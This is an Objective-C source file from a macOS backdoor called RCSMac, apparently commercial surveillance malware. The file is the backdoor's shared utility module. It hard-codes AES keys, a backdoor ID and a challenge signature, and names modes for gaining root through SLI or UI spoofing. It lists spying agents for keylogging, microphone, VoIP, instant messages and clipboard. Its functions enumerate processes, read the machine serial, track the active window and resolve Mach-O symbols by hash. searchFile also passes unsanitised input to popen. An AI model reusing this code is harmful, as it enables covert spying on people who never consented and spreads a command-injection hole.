/*
 * RCSMac - RCSMCommon
 *
 * A common place for shit of (id) == (generalization FTW)
 *
 * Created by Alfredo 'revenge' Pesoli on 08/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <objc/objc-class.h>

#import <Carbon/Carbon.h>
#import <IOKit/IOKitLib.h>
#import <CoreAudio/CoreAudio.h>
#import <CoreFoundation/CoreFoundation.h>

#import <mach-o/loader.h>
#import <mach-o/fat.h>
#import <mach-o/nlist.h>

#import "RCSMCommon.h"


#import "RCSMDebug.h"
#import "RCSMLogger.h"


// Remember to md5 this
#ifndef DEV_MODE
char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
#else
char  gLogAesKey[]      = "-E18Yzo70cIDgzV4MRriFpJn4TOL0E23";
#endif

#ifndef DEV_MODE
char  gConfAesKey[]     = "Adf5V57gQtyi90wUhpb8Neg56756j87R"; // default
#else
char  gConfAesKey[]     = "oTfug1JYLAR62r07RLSgpWnPrjSPmnRF";
#endif

// Instance ID (20 bytes) unique per backdoor/user
char gInstanceId[]  = "bg5etG87q20Kg52W5Fg1";

// Backdoor ID (16 bytes) (NULL terminated)
#ifndef DEV_MODE
char gBackdoorID[]  = "av3pVck1gb4eR2d8"; // default
#else
char gBackdoorID[16]  = "RCS_0000000307";
#endif

// Challenge Key
#ifndef DEV_MODE
char gBackdoorSignature[] = "f7Hk0f5usd04apdvqw13F5ed25soV5eD"; //default
#else
char gBackdoorSignature[] = "4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z";
#endif

//
// gMode specifies all the possible ways the backdoor can behave:
//  1 - getRootThroughSLI
//  2 - getRootThroughUISpoofing
//
#ifndef DEV_MODE
char gMode[]          = "iuherEoR93457dFADfasDjfNkA7Txmkl";
#else
char gMode[]          = "Ah57K";
#endif

int gMemCommandMaxSize = 0x3000;
int gMemLogMaxSize     = 0x302460;

RCSMSharedMemory  *gSharedMemoryCommand;
RCSMSharedMemory  *gSharedMemoryLogging;
RCSMUtils         *gUtil;

NSLock            *gSuidLock        = nil;
NSLock            *gControlFlagLock = nil;
NSData            *gSessionKey      = nil;

NSString *gBackdoorName             = nil;
NSString *gBackdoorUpdateName       = nil;
NSString *gConfigurationName        = nil;
NSString *gConfigurationUpdateName  = nil;
NSString *gInputManagerName         = nil;
NSString *gKextName                 = nil;

u_int remoteAgents[8] = { OFFT_KEYLOG,
                          OFFT_PRINTER,
                          OFFT_VOIP,
                          OFFT_URL,
                          OFFT_MOUSE,
                          OFFT_MICROPHONE,
                          OFFT_IM,
                          OFFT_CLIPBOARD };

u_int gVersion        = 2011011101;
u_int gSkypeQuality   = 0;

// OS version
u_int gOSMajor  = 0;
u_int gOSMinor  = 0;
u_int gOSBugFix = 0;

int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
{
  int             err;
  kinfo_proc      *result;
  bool            done;
  static const int name[] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
  size_t          length;
  
  // a valid pointer procList holder should be passed
  assert(procList != NULL);
  // But it should not be pre-allocated
  assert(*procList == NULL);
  // a valid pointer to procCount should be passed
  assert(procCount != NULL);
  
  *procCount = 0;
  
  result = NULL;
  done = false;
  
  do
    {
      assert(result == NULL);
      
      // Call sysctl with a NULL buffer to get proper length
      length = 0;
      err = sysctl((int *)name, (sizeof(name) / sizeof(*name)) - 1, NULL, &length, NULL, 0);
      if (err == -1)
        err = errno;
      
      // Now, proper length is obtained
      if (err == 0)
        {
          result = malloc(length);
          if (result == NULL)
            err = ENOMEM;   // not allocated
        }
      
      if (err == 0)
        {
          err = sysctl((int *)name, (sizeof(name) / sizeof(*name)) - 1, result, &length, NULL, 0);
          if ( err == -1 )
            err = errno;
          
          if (err == 0)
            done = true;
          else if (err == ENOMEM)
            {
              assert(result != NULL);
              free(result);
              result = NULL;
              err = 0;
            }
        }
    }
  while (err == 0 && !done);
  
  // Clean up and establish post condition  
  if (err != 0 && result != NULL)
    {
      free(result);
      result = NULL;
    }
  
  *procList = result; // will return the result as procList
  if (err == 0)
    *procCount = length / sizeof(kinfo_proc);
  
  assert ((err == 0) == (*procList != NULL ));
  
  return err;
}  

NSArray *obtainProcessList()
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  int i;
  kinfo_proc *allProcs = 0;
  size_t numProcs;
  NSString *procName;
  NSMutableArray *processList;
  
  int err =  getBSDProcessList(&allProcs, &numProcs);
  if (err)
    return nil;
  
  processList = [[NSMutableArray alloc] initWithCapacity: numProcs];
  
  for (i = 0; i < numProcs; i++)
    {
      procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
      [processList addObject: [procName lowercaseString]];
    }
  
  free(allProcs);
  [outerPool release];
  
  return [processList autorelease];
}

NSArray *obtainProcessListWithPid()
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  int i;
  kinfo_proc *allProcs = 0;
  size_t numProcs;
  NSMutableArray *processList;
  
  int err =  getBSDProcessList(&allProcs, &numProcs);
  if (err)
    return nil;
  
  processList = [[NSMutableArray alloc] initWithCapacity: numProcs];
  
  for (i = 0; i < numProcs; i++)
    {
      NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
      
      NSString *procName = [NSString stringWithFormat: @"%s", allProcs[i].kp_proc.p_comm];
      NSNumber *pid = [NSNumber numberWithInt: allProcs[i].kp_proc.p_pid];
      
      NSDictionary *processDict = [NSDictionary dictionaryWithObjectsAndKeys: procName, @"procName", pid, @"pid", nil, nil];
      
      [processList addObject: processDict];
      
      [inner release];
    }
  
  free(allProcs);
  [outerPool release];
  
  return [processList autorelease];
}

BOOL findProcessWithName(NSString *aProcess)
{
  NSArray *processList;
  
  processList = obtainProcessList();
  [processList retain];
  
  for (NSString *currentProcess in processList)
    {
      //if (strcmp([currentProcess UTF8String], [[aProcess lowercaseString] UTF8String]) == 0)
      if (matchPattern([currentProcess UTF8String],
                       [[aProcess lowercaseString] UTF8String]))
        {
          [processList release];
          return YES;
        }
    }
  
  [processList release];
  return NO;
}

NSNumber *pidForProcessName(NSString *aProcess)
{
  NSArray *processList;
  
  processList = obtainProcessListWithPid();
  [processList retain];
  
  for (NSDictionary *currentProcess in processList)
    {
      //if (strcmp([currentProcess UTF8String], [[aProcess lowercaseString] UTF8String]) == 0)
      NSString *procName = [currentProcess objectForKey: @"procName"];
      
      if (matchPattern([[procName lowercaseString] UTF8String],
                       [[aProcess lowercaseString] UTF8String]))
        {
          [processList release];
          return [currentProcess objectForKey: @"pid"];
        }
    }
  
  [processList release];
  
  return nil;
}

BOOL isAddressOnLan(struct in_addr ipAddress)
{
  struct ifaddrs *iface, *ifacesHead;
  
  //
  // Get Interfaces information
  //
  if (getifaddrs(&ifacesHead) == 0)
    {
      for (iface = ifacesHead; iface != NULL; iface = iface->ifa_next)
        { 
          if (iface->ifa_addr == NULL || iface->ifa_addr->sa_family != AF_INET)
            continue;
          
          if ( (((struct sockaddr_in *)iface->ifa_addr)->sin_addr.s_addr & ((struct sockaddr_in *)iface->ifa_netmask)->sin_addr.s_addr) ==
               (ipAddress.s_addr & ((struct sockaddr_in *)iface->ifa_netmask)->sin_addr.s_addr) && ((struct sockaddr_in *)iface->ifa_netmask)->sin_addr.s_addr)
            {
              freeifaddrs(ifacesHead);
              
              return TRUE;
            }
        }
        
      freeifaddrs(ifacesHead);
    }
  else
    {
#ifdef DEBUG_COMMON
      errorLog(@"Error while querying network interfaces");
#endif
    }
  
  return FALSE;
}

BOOL isAddressAlreadyDetected(NSString *ipAddress,
                              int aPort,
                              NSString *netMask,
                              NSMutableArray *ipDetectedList)
{
  NSEnumerator *enumerator = [ipDetectedList objectEnumerator];
  id anObject;
  
  while ((anObject = [enumerator nextObject]))
    {
      if ([[anObject objectForKey: @"ip"] isEqualToString: ipAddress])
        {
          if ((aPort == 0 || [[anObject objectForKey: @"port"] intValue] == aPort)
              && ([[anObject objectForKey: @"netmask"] isEqualToString: netMask]))
            {
              return TRUE;
            }
        }
    }
  
  return FALSE;
}

BOOL compareIpAddress(struct in_addr firstIp,
                      struct in_addr secondIp,
                      u_long netMask)
{
  struct ifaddrs *iface, *ifacesHead;
  u_long ip1, ip2;
  
  //
  // Get Interfaces information
  //
  if (getifaddrs(&ifacesHead) == 0)
    {
      for (iface = ifacesHead; iface != NULL; iface = iface->ifa_next)
        { 
          if (iface->ifa_addr == NULL || iface->ifa_addr->sa_family != AF_INET)
            continue;
          
          ip1 = firstIp.s_addr & netMask;
          ip2 = secondIp.s_addr & netMask;
          
          if (ip1 == ip2)
            {
              freeifaddrs(ifacesHead);
              return TRUE;
            }
        }
      freeifaddrs(ifacesHead);
    }
  else
    {
#ifdef DEBUG_COMMON_ERRORS
      errorLog(@"Error while querying network interfaces");
#endif
    }
  
  return FALSE;
}

NSString *getHostname()
{
  NSProcessInfo *processInfo = [NSProcessInfo processInfo];
  NSString *hostName = [processInfo hostName];

  return hostName;
}

//
// Returns the serial number as a CFString.
// It is the caller's responsibility to release the returned CFString when done with it.
// http://developer.apple.com/mac/library/technotes/tn/tn1103.html
//
void getSystemSerialNumber(CFStringRef *serialNumber)
{
  if (serialNumber != NULL)
    {
      *serialNumber = NULL;
      
      io_service_t    platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                                   IOServiceMatching("IOPlatformExpertDevice"));
      
      if (platformExpert)
        {
          CFTypeRef serialNumberAsCFString =
            IORegistryEntryCreateCFProperty(platformExpert,
                                            CFSTR(kIOPlatformSerialNumberKey),
                                            kCFAllocatorDefault, 0);
          if (serialNumberAsCFString)
            {
              *serialNumber = serialNumberAsCFString;
            }
          
          IOObjectRelease(platformExpert);
        }
    }
}

int matchPattern(const char *source, const char *pattern)
{
  if (source == NULL || pattern == NULL)
    {
      return 0;
    }
  
#ifdef DEBUG_COMMON
  verboseLog(@"source : %s", source);
  verboseLog(@"pattern: %s", pattern);
#endif
  
  for (;;)
    {
      if (!*pattern)
        return (!*source);
      
      if (*pattern == '*')
        {
          pattern++;
          
          if (!*pattern)
            return (1);
    
          if (*pattern != '?' && *pattern != '*')
            {
              for (; *source; source++)
                {
                  if (*source == *pattern && matchPattern(source + 1, pattern + 1))
                    return (1);
                }
              
              return (0);
            }
          
          for (; *source; source++)
            {
              if (matchPattern(source, pattern))
                return (1);
            }
          
          return (0);
        }
      
      if (!*source)
        return (0);
      
      if (*pattern != '?' && *pattern != *source)
        return (0);
      
      source++;
      pattern++;
    }
}

NSArray *searchForProtoUpload(NSString *aFileMask)
{
  NSFileManager *_fileManager = [NSFileManager defaultManager];
  NSString *filePath          = [aFileMask stringByDeletingLastPathComponent];
  NSString *fileNameToMatch   = [aFileMask lastPathComponent];
  NSMutableArray *filesFound  = [[NSMutableArray alloc] init];
  
	BOOL isDir;
  int i;
  
	[_fileManager fileExistsAtPath: filePath
                     isDirectory: &isDir];
  
  if (isDir == TRUE)
    {
      NSArray *dirContent = [_fileManager contentsOfDirectoryAtPath: filePath
                                                              error: nil];
      
      int filesCount = [dirContent count];
      for (i = 0; i < filesCount; i++)
        {
          NSString *fileName = [dirContent objectAtIndex: i];
          
          if (matchPattern([fileName UTF8String],
                           [fileNameToMatch UTF8String]))
            {
              NSString *foundFilePath = [NSString stringWithFormat: @"%@/%@", filePath, fileName];
              [filesFound addObject: foundFilePath];
            }
        }
    }
  
  if ([filesFound count] > 0)
    {
      return [filesFound autorelease];
    }
  else
    {
      [filesFound release];
      
      return nil;
    }
}

NSArray *searchFile(NSString *aFileMask)
{
  FILE *fp;
  char path[1035];
  NSMutableArray *fileFound = [[NSMutableArray alloc] init];
#ifdef DEBUG_COMMON
  infoLog(@"aFileMask: %@", [aFileMask dataUsingEncoding: NSUTF8StringEncoding]);
#endif
  NSString *commandString = [NSString stringWithFormat: @"/usr/bin/find %@", aFileMask];
  
  fp = popen([commandString cStringUsingEncoding: NSUTF8StringEncoding], "r");
  
  if (fp == NULL)
    {
#ifdef DEBUG_COMMON
      errorLog(@"Failed to run command");
#endif
      
      [fileFound release];
      return nil;
    }
  
  while (fgets(path, sizeof(path) - 1, fp) != NULL)
    {
      NSString *tempPath = [[NSString stringWithUTF8String: path]
                            stringByReplacingOccurrencesOfString: @"\n"
                                                      withString: @""];
#ifdef DEBUG_COMMON
      infoLog(@"path: %@", tempPath);
#endif
      [fileFound addObject: tempPath ];
    }
#ifdef DEBUG_COMMON
  warnLog(@"fileFound: %@", fileFound);
#endif
  pclose(fp);
  
  return [fileFound autorelease];
}

static unsigned int
sdbm (unsigned char *str)
{
  unsigned int hash = 0;
  int c;
  
  while ((c = *str++))
    hash = c + (hash << 6) + (hash << 16) - hash;
  
  return hash;
}

unsigned int
findSymbolInFatBinary (void *imageBase, unsigned int symbolHash)
{
#ifdef DEBUG
  printf("[ii] findSymbolInFatBinary!\n");
#endif
  
  if (imageBase == NULL)
    {
      return -1;
    }
  
  struct mach_header *mh_header       = NULL;
  struct load_command *l_command      = NULL; 
  struct nlist *sym_nlist             = NULL; 
  struct symtab_command *sym_command  = NULL;
  struct segment_command *seg_command = NULL;
  struct fat_header *f_header         = NULL;
  struct fat_arch *f_arch             = NULL;
  
  char *symbolName = NULL;
  
  int offset, symbolOffset, stringOffset, x86Offset, i, found, nfat;
  
  unsigned int linkeditHash = 0xf51f49c4; // "__LINKEDIT" sdbm hashed
  unsigned int hash;
  
  offset = found = 0;
  f_header = (struct fat_header *)imageBase;
  
  offset += sizeof (struct fat_header);
  nfat = SWAP_LONG (f_header->nfat_arch);
  
#ifdef DEBUG
  printf("[ii] magic: %x\n", f_header->magic);
  printf("[ii] nFatArch: %d\n", nfat);
#endif
  
  for (i = 0; i < nfat; i++)
    {
      f_arch = imageBase + offset;
      int cpuType = SWAP_LONG (f_arch->cputype);
      
      if (cpuType == 0x7)
        break;
      
      offset += sizeof (struct fat_arch);
    }	
  
  if (f_arch == NULL)
    return -1;
  
  x86Offset = SWAP_LONG (f_arch->offset);
#ifdef DEBUG
  printf ("[ii] x86 offset: %x\n", x86Offset);
#endif
  
  offset = x86Offset;
  mh_header = (struct mach_header *)(imageBase + offset); 
  offset += sizeof (struct mach_header);
  
#ifdef DEBUG
  printf("imageBase in findSymbolFat: %p\n", mh_header);
#endif
  
#ifdef DEBUG
  printf("[ii] ncmdsFat: %d\n", mh_header->ncmds);
#endif
  
  for (i = 0; i < mh_header->ncmds; i++)
    {
      l_command = imageBase + offset; 
    
#ifdef DEBUG
      printf("[ii] cmdFat: %d\n", l_command->cmd);
#endif
      
      if (l_command->cmd == LC_SEGMENT)
        {
          if (found)
            {
              offset += l_command->cmdsize;
              continue;
            }
          
          seg_command = imageBase + offset;
          
#ifdef DEBUG
          printf("[ii] segNameFat: %s\n", seg_command->segname);
#endif
      
          if (sdbm ((unsigned char *)seg_command->segname) == linkeditHash)
            found = 1;
        }
      else if (l_command->cmd == LC_SYMTAB)
        {
          sym_command = imageBase + offset; 
          
          if (found)
            break;
        }
        
      offset += l_command->cmdsize;
    }
      
  if (sym_command != NULL)
    {
      symbolOffset = x86Offset + sym_command->symoff;
      stringOffset = x86Offset + sym_command->stroff;
    }
  else
    {
      return -1;
    }
  
#ifdef DEBUG
  printf("[ii] offsetFat: %x\n", offset);
  printf("[ii] stringOffsetFat: %x\n", stringOffset);
  printf("[ii] nSymsFat: %d\n", sym_command->nsyms);
#endif
  
  for (i = 0; i < sym_command->nsyms; i++)
    {
      sym_nlist = (struct nlist *)(imageBase + symbolOffset);
      symbolOffset += sizeof (struct nlist);
      
      if (sym_nlist->n_un.n_strx == 0x0)
        {
          continue;
        }
    
      symbolName  = (char *)(imageBase + sym_nlist->n_un.n_strx + stringOffset);
      hash = sdbm ((unsigned char *)symbolName);
      
#ifdef DEBUG_VERBOSE
      printf ("[ii] SYMBOLFat: %s\n", symbolName);
#endif
      if (hash == symbolHash)
        {
#ifdef DEBUG
          printf ("[ii] Symbol Found\n");
          printf ("[ii] SYMBOLFat: %s\n", symbolName);
          printf ("[ii] addressFat: %x\n", sym_nlist->n_value);
#endif
          
          return sym_nlist->n_value;
        }
    }
  
  return -1;
}

#ifdef DEBUG_LOG
void printFormatFlags(AudioStreamBasicDescription inDescription)
{
  const char *theEndianString = NULL;
  bool inAbbreviate = TRUE;
  
  if ((inDescription.mFormatFlags & kAudioFormatFlagIsBigEndian) != 0)
    {
#if	TARGET_RT_LITTLE_ENDIAN
      theEndianString = "Big Endian";
#endif
    }
  else
    {
#if	TARGET_RT_BIG_ENDIAN
      theEndianString = "Little Endian";
#endif
    }
  
  const char* theKindString = NULL;
  if ((inDescription.mFormatFlags & kAudioFormatFlagIsFloat) != 0)
    {
      theKindString = (inAbbreviate ? "Float" : "Floating Point");
    }
  else if ((inDescription.mFormatFlags & kAudioFormatFlagIsSignedInteger) != 0)
    {
      theKindString = (inAbbreviate ? "SInt" : "Signed Integer");
    }
  else
    {
      theKindString = (inAbbreviate ? "UInt" : "Unsigned Integer");
    }
  
  const char* thePackingString = NULL;
  if ((inDescription.mFormatFlags & kAudioFormatFlagIsPacked) == 0)
    {
      if ((inDescription.mFormatFlags & kAudioFormatFlagIsAlignedHigh) != 0)
        {
          thePackingString = "High";
        }
      else
        {
          thePackingString = "Low";
        }
    }
  
  const char* theMixabilityString = NULL;
  if ((inDescription.mFormatFlags & kAudioFormatFlagIsNonMixable) == 0)
    {
      theMixabilityString = "Mixable";
    }
  else
    {
      theMixabilityString = "Unmixable";
    }
  
  if ((inDescription.mFormatFlags & kAudioFormatFlagIsNonInterleaved) == 0)
    {
      theMixabilityString = "Interleaved";
    }
  else
    {
      theMixabilityString = "Non-Interleaved";
    }
  
  if (inAbbreviate)
    {
      if (theEndianString != NULL)
        {
          if (thePackingString != NULL)
            {
#ifdef DEBUG_LOG_VERBOSE_1
              const char* theInterleavingString = NULL;
              infoLog(@"format: %s %s %d Ch %s %s %s%d/%s%d", theMixabilityString, theInterleavingString, (int)inDescription.mChannelsPerFrame, theEndianString, thePackingString, theKindString, (int)inDescription.mBitsPerChannel, theKindString, (int)(inDescription.mBytesPerFrame / inDescription.mChannelsPerFrame) * 8);
#endif
            }
          else
            {
#ifdef DEBUG_LOG_VERBOSE_1
              infoLog(@"format: %s %s %d Ch %s %s%d", theMixabilityString, theInterleavingString, (int)inDescription.mChannelsPerFrame, theEndianString, theKindString, (int)inDescription.mBitsPerChannel);
#endif
            }
        }
      else
        {
          if (thePackingString != NULL)
            {
#ifdef DEBUG_LOG_VERBOSE_1
              infoLog(@"%s %d Ch %s %s%d/%s%d", theMixabilityString, (int)inDescription.mChannelsPerFrame, thePackingString, theKindString, (int)inDescription.mBitsPerChannel, theKindString, (int)((inDescription.mBytesPerFrame / inDescription.mChannelsPerFrame) * 8));
#endif
            }
          else
            {
#ifdef DEBUG_LOG_VERBOSE_1
              infoLog(@"%s %d Ch %s%d", theMixabilityString, (int)inDescription.mChannelsPerFrame, theKindString, (int)inDescription.mBitsPerChannel);
#endif
            }
        }
    }
  else
    {
      if (theEndianString != NULL)
        {
          if (thePackingString != NULL)
            {
#ifdef DEBUG_LOG_VERBOSE_1
              infoLog(@"%s %d Channel %d Bit %s %s Aligned %s in %d Bits", theMixabilityString, (int)inDescription.mChannelsPerFrame, (int)inDescription.mBitsPerChannel, theEndianString, theKindString, thePackingString, (int)(inDescription.mBytesPerFrame / inDescription.mChannelsPerFrame) * 8);
#endif
            }
          else
            {
#ifdef DEBUG_LOG_VERBOSE_1
              infoLog(@"%s %d Channel %d Bit %s %s", theMixabilityString, (int)inDescription.mChannelsPerFrame, (int)inDescription.mBitsPerChannel, theEndianString, theKindString);
#endif
            }
        }
      else
        {
          if (thePackingString != NULL)
            {
#ifdef DEBUG_LOG_VERBOSE_1
              infoLog(@"%s %d Channel %d Bit %s Aligned %s in %d Bits", theMixabilityString, (int)inDescription.mChannelsPerFrame, (int)inDescription.mBitsPerChannel, theKindString, thePackingString, (int)(inDescription.mBytesPerFrame / inDescription.mChannelsPerFrame) * 8);
#endif
            }
          else
            {
#ifdef DEBUG_LOG_VERBOSE_1
              infoLog(@"%s %d Channel %d Bit %s", theMixabilityString, (int)inDescription.mChannelsPerFrame, (int)inDescription.mBitsPerChannel, theKindString);
#endif
            }
        }
    }
}
#endif

size_t _utf16len(unichar *string)
{
  size_t len;
  
  unichar *p = string;
  while(*p != 0) p++;
  
  len = (unichar *)p - (unichar *)string;
  
  return len;
}

NSDictionary *getActiveWindowInfo()
{
  ProcessSerialNumber psn = { 0,0 };
  NSDictionary *activeAppInfo;
  
  OSStatus success;
  
  CFArrayRef windowsList;
  int windowPID;
  pid_t pid;
  
  NSNumber *windowID    = nil;
  NSString *processName = nil;
  NSString *windowName  = nil;
  
  // Active application on workspace
  activeAppInfo =  [[NSWorkspace sharedWorkspace] activeApplication];
  psn.highLongOfPSN = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberHigh"]
                       unsignedIntValue];
  psn.lowLongOfPSN  = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberLow"]
                       unsignedIntValue];
  
  // Get PID of the active Application(s)
  if (success = GetProcessPID(&psn, &pid) != 0)
    return nil;
  
  // Window list front to back
  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
                                           kCGNullWindowID);
  
  if (windowsList == NULL)
    return nil;
  
  for (NSMutableDictionary *entry in (NSArray *)windowsList)
    {
      windowPID = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
      
      if (windowPID == pid)
        {
          windowID    = [NSNumber numberWithUnsignedInt:
                         [[[entry objectForKey: (id)kCGWindowNumber] retain] unsignedIntValue]];
          processName = [[entry objectForKey: (id)kCGWindowOwnerName] copy];
          windowName  = [[entry objectForKey: (id)kCGWindowName] copy];
          break;
        }
    }
  
  CFRelease(windowsList);
  
  if (windowPID != pid)
    return nil;
  
  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
                   @"processName",
                   @"windowName",
                   nil];
  NSArray *objects = [NSArray arrayWithObjects: windowID,
                      processName,
                      windowName,
                      nil];
  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
                                                           forKeys: keys];
  
  [windowID release];
  [processName release];
  [windowName release];
  
  return windowInfo;
}


#ifdef DEMO_VERSION
void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal)
{
  NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
  
  NSMutableDictionary *desktopDict    = [NSMutableDictionary dictionaryWithDictionary:
                                         [defaults persistentDomainForName: @"com.apple.desktop"]];
                                         
  NSMutableDictionary *backgroundDict = [NSMutableDictionary dictionaryWithDictionary:
                                         [desktopDict objectForKey: @"Background"]];
  id key;
  NSArray *tempArray = [backgroundDict allKeys];
  
  for (key in tempArray)
    {
      NSMutableDictionary *defaultDict = [NSMutableDictionary dictionaryWithDictionary:
                                          [backgroundDict objectForKey: key]];
      
      if (wantToRestoreOriginal)
        {
          NSString *imageToRemove = [defaultDict objectForKey: @"ImageFilePath"];
          [[NSFileManager defaultManager] removeItemAtPath: imageToRemove
                                                     error: nil];
        }
      
      [defaultDict setObject: aFilePath forKey: @"ImageFilePath"];
      [defaultDict setObject: aFilePath forKey: @"NewImageFilePath"];
      
      [backgroundDict setObject: defaultDict forKey: key];
    }

  [desktopDict setObject: backgroundDict
                  forKey: @"Background"];
  
  [defaults setPersistentDomain: desktopDict
                        forName: @"com.apple.desktop"];

  if ([defaults synchronize] == NO)
    {
#ifdef DEBUG_COMMON
      errorLog(@"synchronize failed");
#endif
    }
  
  //
  // Post a notification in order to update desktop image
  //
  [[NSDistributedNotificationCenter defaultCenter] postNotificationName: @"com.apple.desktop"
                                                                 object: @"BackgroundChanged"];
}
#endif
